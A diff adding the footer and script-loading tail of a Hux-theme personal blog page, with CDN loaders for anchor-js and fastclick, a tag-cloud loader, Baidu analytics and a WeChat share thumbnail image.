+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
